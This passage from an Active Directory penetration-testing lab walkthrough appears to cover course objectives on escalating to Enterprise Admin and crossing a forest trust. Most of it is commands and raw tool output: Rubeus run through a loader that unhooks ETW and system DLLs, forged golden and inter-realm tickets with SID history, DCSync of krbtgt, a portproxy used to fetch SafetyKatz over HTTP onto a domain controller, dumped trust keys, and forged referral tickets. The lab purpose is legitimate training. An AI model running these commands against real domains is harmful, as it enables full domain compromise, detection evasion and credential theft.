  ServiceName              :  http/mcorp-dc.MONEYCORP.LOCAL
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  9/29/2025 2:03:26 PM
  EndTime                  :  9/30/2025 12:02:36 AM
  RenewTill                :  10/6/2025 2:02:36 PM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  IMQ+JPBEXLjKRLCbtA3NSDgctYDCysbvHW07rAx+5h4=
```

### Once the ticket is injected, we can access mcorp-dc

* C:\AD\Tools> winrs -r:mcorp-dc.moneycorp.local cmd
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.
```

* C:\Users\Administrator.dcorp>set username
```
set username
USERNAME=Administrator
```

* C:\Users\Administrator.dcorp>set computername
```
set computername
COMPUTERNAME=MCORP-DC
```

### Learning Objective 19:
```
• Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admins using 
dollarcorp's krbtgt hash
```

We already have the krbtgt hash from dcorp-dc. Let's create the inter-realm TGT and inject. 

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'

[*] AuthTime       : 9/29/2025 2:09:40 PM
[*] StartTime      : 9/29/2025 2:09:40 PM
[*] EndTime        : 9/30/2025 12:09:40 AM
[*] RenewTill      : 10/6/2025 2:09:40 PM

[*] base64(ticket.kirbi):

      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


[+] Ticket successfully imported!
```

We can now access mcorp-dc

* C:\AD\Tools> winrs -r:mcorp-dc.moneycorp.local cmd

* C:\Users\Administrator.dcorp> set computername
```
set username
USERNAME=Administrator
```

* C:\Users\Administrator.dcorp>set computername
```
set computername
COMPUTERNAME=MCORP-DC
```

We can also execute the DCSync attacks against moneycorp. Use the following command in the above 
prompt where we injected the ticket

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"


## Learning Objective 20:
```
• With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the 
DC of eurocorp.local forest.
```

Extract the trust key

We need the trust key for the trust between dollarcorp and eurocrop, which can be retrieved using 
Mimikatz or SafetyKatz.

Start a process with DA privileges. Run the below command from an elevated command prompt

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
[*] Action: Ask TGT

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : JFJ78ZP3
[*] Domain          : JE6GOWRV
[*] Password        : BT289DZX
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3160
[+] LUID            : 0x7c3597

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[*] Target LUID : 8140183
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[*] Target LUID: 0x7c3597
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  svcadmin (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  9/29/2025 5:05:23 PM
  EndTime                  :  9/30/2025 3:05:23 AM
  RenewTill                :  10/6/2025 5:05:23 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  qBCtncEMUwIGiPsyYHzrohnZBq/WbvApuDfC0ogbuzI=
  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
```

Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to 
extract credentials

* C:\Windows\system32> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
* C:\Windows\system32>winrs -r:dcorp-dc cmd
* C:\Users\svcadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.31
* C:\Users\svcadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"

```
mimikatz(commandline) # lsadump::evasive-trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 9/29/2025 6:16:22 AM - CLEAR   - 3d 7b 6d 8e c0 ac dd 93 41 d7 b7 08 52 9b b5 9e fe 9d eb 22 c0 dc 1c 00 a4 29 cf a0
        * aes256_hmac       f5df9e0114b22c7d407390ded7518f099df459b0f5cfa6442a002ff6ada20b08
        * aes128_hmac       5ae1bd2a9ff73bc182f346c29f510cb0
        * rc4_hmac_nt       71aec776d7fcdf15e2c88ad385d3ae56

 [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:16:22 AM - CLEAR   - 3d 7b 6d 8e c0 ac dd 93 41 d7 b7 08 52 9b b5 9e fe 9d eb 22 c0 dc 1c 00 a4 29 cf a0
        * aes256_hmac       971bea1bd496d8a861e5e8eb9c01ad02f86f07c8b1dce9a33bce97d5304121fc
        * aes128_hmac       4b1134b67f242aa25b232be34c477156
        * rc4_hmac_nt       71aec776d7fcdf15e2c88ad385d3ae56

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 9/29/2025 6:01:42 AM - CLEAR   - b4 7c 78 65 11 dd 1a 2c 73 37 09 e7 99 74 df 0c 5f 36 51 ae da cc 31 d6 26 f2 eb cb
        * aes256_hmac       a1c88f2007e13ffd0738c872a8da2cf1a2f5c646ecf7250cf411efa2f4c8089c
        * aes128_hmac       77435bfd4e0f70dbf8b413d997e82831
        * rc4_hmac_nt       0de9fd50b5efab081a6dffdbdad81365

 [Out-1] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:01:42 AM - CLEAR   - b4 7c 78 65 11 dd 1a 2c 73 37 09 e7 99 74 df 0c 5f 36 51 ae da cc 31 d6 26 f2 eb cb
        * aes256_hmac       ffd707848548078e1bbfa9499482b1c52cbf1addd67e80c3ddd3bed09d86af49
        * aes128_hmac       1f54cd8cef36b8ab6b0f651e69640c4b
        * rc4_hmac_nt       0de9fd50b5efab081a6dffdbdad81365


Domain: US.DOLLARCORP.MONEYCORP.LOCAL (US / S-1-5-21-1028785420-4100948154-1806204659)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:16:28 AM - CLEAR   - 1c b8 bb 7c 3b 60 61 c0 18 ed 98 4e dc 5b 1d 95 d7 1a 70 bd 89 e0 6b 1f fd e5 46 aa
        * aes256_hmac       756e2b78302cfcb400ab4828451fd6c5034641dd5624879a4b79af2e75053bd6
        * aes128_hmac       fd860fd4fb33a628edb3f1abbf8641cc
        * rc4_hmac_nt       756d91067ba3e63145b0a23cb8af1b2b

 [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:16:28 AM - CLEAR   - 1c b8 bb 7c 3b 60 61 c0 18 ed 98 4e dc 5b 1d 95 d7 1a 70 bd 89 e0 6b 1f fd e5 46 aa
        * aes256_hmac       18b32ba1c1d4b5ed7d2f32bb6a82483032611c5c5d2635b4c6e3fa803f5f9480
        * aes128_hmac       84c8618a04082c830b4ba775f75ad66a
        * rc4_hmac_nt       756d91067ba3e63145b0a23cb8af1b2b

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:01:56 AM - CLEAR   - 2f fa 6d dc e0 04 e4 b9 eb 0c 5a 66 7b db 0a 4a fb 76 31 61 d8 8d b2 2d 7a 45 06 1b
        * aes256_hmac       c92c7306d29c455980c40ef2166f81e428c1ba5399f56faa86d1e3a6c916b80f
        * aes128_hmac       7a2ff334f3e3347b4d41e84acbdf7855
        * rc4_hmac_nt       44bbb47568e83b4fd4e8dbd3d547c427

 [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:01:56 AM - CLEAR   - 2f fa 6d dc e0 04 e4 b9 eb 0c 5a 66 7b db 0a 4a fb 76 31 61 d8 8d b2 2d 7a 45 06 1b
        * aes256_hmac       918d8d3ba3c5f32137108b68701476236d55826a06c2fa957b8fe25d118279ec
        * aes128_hmac       d20b6dbe66437dc4b7d9d1adfd6958f5
        * rc4_hmac_nt       44bbb47568e83b4fd4e8dbd3d547c427


Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 9/29/2025 6:16:26 AM - CLEAR   - 53 8d 46 98 c8 18 29 2a 3e 8e 98 a9 ae 58 6f 48 ae 3e 69 1b 71 45 75 33 ee fe a9 a1
        * aes256_hmac       7ca2124ec30f6e3428d216b010b1000565c7da3394514e45e4cf07db2a03282b
        * aes128_hmac       021aa8b46cd27277f611face6f4faef8
        * rc4_hmac_nt       d390a1c5ea42d2cfce4058c1a128fbba

 [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:16:26 AM - CLEAR   - 53 8d 46 98 c8 18 29 2a 3e 8e 98 a9 ae 58 6f 48 ae 3e 69 1b 71 45 75 33 ee fe a9 a1
        * aes256_hmac       ba7cc062e3388afc9b39c56a9e35fb77b899abb7dd7ceb9aed9d758f3f7c490f
        * aes128_hmac       39d348732d144bec494bdec80b792db7
        * rc4_hmac_nt       d390a1c5ea42d2cfce4058c1a128fbba

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 9/29/2025 6:01:52 AM - CLEAR   - 1e bb db 29 af 1d 95 9c 78 4c dc 2c 5b 24 e9 56 e4 ae 04 dc 5a 99 cb 45 77 aa 34 c5
        * aes256_hmac       10a0b7415471a1a1eb373a6076d0d916c155afee964d30e218871186c57b2c6c
        * aes128_hmac       786bd9d0c950fb1c3c56626ab7b2ffb4
        * rc4_hmac_nt       603518e54242753e9b77f4e7d702ff6c

 [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 9/29/2025 6:01:52 AM - CLEAR   - 1e bb db 29 af 1d 95 9c 78 4c dc 2c 5b 24 e9 56 e4 ae 04 dc 5a 99 cb 45 77 aa 34 c5
        * aes256_hmac       f56429861d982209946d43adfa40405310c456010f64cccccb02b9e636245f51
        * aes128_hmac       5004628e8ae8d7e6e1503e6017f70bf8
        * rc4_hmac_nt       603518e54242753e9b77f4e7d702ff6c

mimikatz(commandline) # exit
Bye!
```

### Forge a referral ticket
Let’s Forge a referral ticket. 

Note that we are not injecting any SID History here as it would be filtered out.

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:d390a1c5ea42d2cfce4058c1a128fbba /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:d390a1c5ea42d2cfce4058c1a128fbba /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
[*] Action: Build TGS

[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully mounted
[*] Attempting to unmount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully mounted
[*] Attempting to unmount: \\us.dollarcorp.moneycorp.local\SYSVOL
[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Retrieving group information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513))'
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : D390A1C5EA42D2CFCE4058C1A128FBBA
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : D390A1C5EA42D2CFCE4058C1A128FBBA
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : DOLLARCORP.MONEYCORP.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'

[*] AuthTime       : 9/29/2025 5:15:47 PM
[*] StartTime      : 9/29/2025 5:15:47 PM
[*] EndTime        : 9/30/2025 3:15:47 AM
[*] RenewTill      : 10/6/2025 5:15:47 PM

[*] base64(ticket.kirbi):

      doIGFjCCBhKgAwIBBaEDAgEWooIE4jCCBN5hggTaMIIE1qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBH4wggR6oAMCARehAwIBA6KCBGwEggRoRZdWVkIEP77T7pHoHgIIEd4zZKZIPfH6cSsq0hgGJIFPwo/z+dJZmoYzY85mDqZGIooPC1IJO1OljkBMpUtJMW4QCPDR9p6tgH5VbMUazWRikOShN5AaIQiaPwbQWRE36AAYFgciKnCInxWPgpFY1yMA8oUb3Gf56oo70QsPhfym6cKgjWoGc/ktFezdkoHS8gmpHm1LNovkBudWeav6LF+fsoN3qCHXTfznfF0HeWw+jt2RrywOpluSQUAFRlI5S0SIljlzQ+ZWX7lzuKgZE/O/V6VTckw4cTOaszakmnSLbL5GYo4xRAd856kv7SYrBC/hAqPpfvRd1rpQri3Cox/ToVERFb7ekADJKIUSp2/cbizKET+mDorAYYq069VtCV+2e8/oGPK5xHM1ZTV5HFX4++UVxcdL5vg0SmFiOhFMDzXf1F8TDWvPSUIdFPXxCgH11jmuUmIDwYZDryuLJRvngXBUNNFVoPfqmhyXr7jQnamhBbJWluRAJEIBcgeWQoQ7q/0XcVGkYJWftQU9z2jV/Dfun3zs1rmHthqG865TyAd0pMtnfEQKpS6mLYVZ2uSw1MCY60eBcPwZ+08QOMxa/9Bt8svL58HYWtZZnAaH/s8wOQF9600KzLL2mDH+4zsvbOy8R3IS4HHPlzncpqbxSvE6tP/1pKuFGYKgXyTGtH8Ve7z/EcPxtpZwaWad8UzRH/LOfMv/pvMoXU4fkUM1H/uQAYeYEN4kbwGJqIYNAZgr1iNamIx9YbyrwyJHNk7TSkHff3f+007qOitR8JWOuBOA4ym7ExMiF9rQ5Yq7nl+8o6k28F366Zc+PjrCa1dt79p6U8kcEikCrUcXNSvSKeb+WgoQU5VxA7CXyLlwKvOZle37PpZKqJGsaJvCDOQBxfpn80n+uAGw7NKYtwi5V1+mPxMVs3LsqHPNjAFK0B1FGtiXnwzildYJ7QEadHnNF+TdziE+53+Z01/jZaABBj86+yyUb1MV/5WMXARclMl8yw2wQCf/sJzZ7PMoAR9H2t2bbzu+BGUYN7fFPxhxgS2uIKW1Oe3drOsJ6sIK4Y03i6QJiQ+3GVzj0cylpO+4hkrPv3NZMVrNj5U5HD+4jYQJeQc5VnvyvZolr0W2oPbtpbTeUZkwMrE2ITGR6bRO/H3BJnGY2ZlXYJzoomDl9IjxOl3DDk+JpEVhXA44ZW4emI70eZBfPqgSdPweq5T3rQFwQgbfLAF3YZBNgBDul9yXNSGEEaoPYRAcnAn52nISLVR5XoljfFqZuG/cY8vaLVNHNSuNSwJz3MyHknFYCg9+JwQiRm8hUReogtyzd2QiDdVJu0MBNzcEbv+XHnnRXpfK45uJyOwvbpFW+psKNkhfazOqXfe7e9S5uxzHSMNpoAcfWCHm5tdJ6a+1ucDgbCSLjVy3RWvVL0dCDZm5+0N1/IqsGN2ZPQj9mFJmYf82ZWkB2+IYlMVttzfFy/oNMVR7S+MzKIMMMM68mXint0CSxfW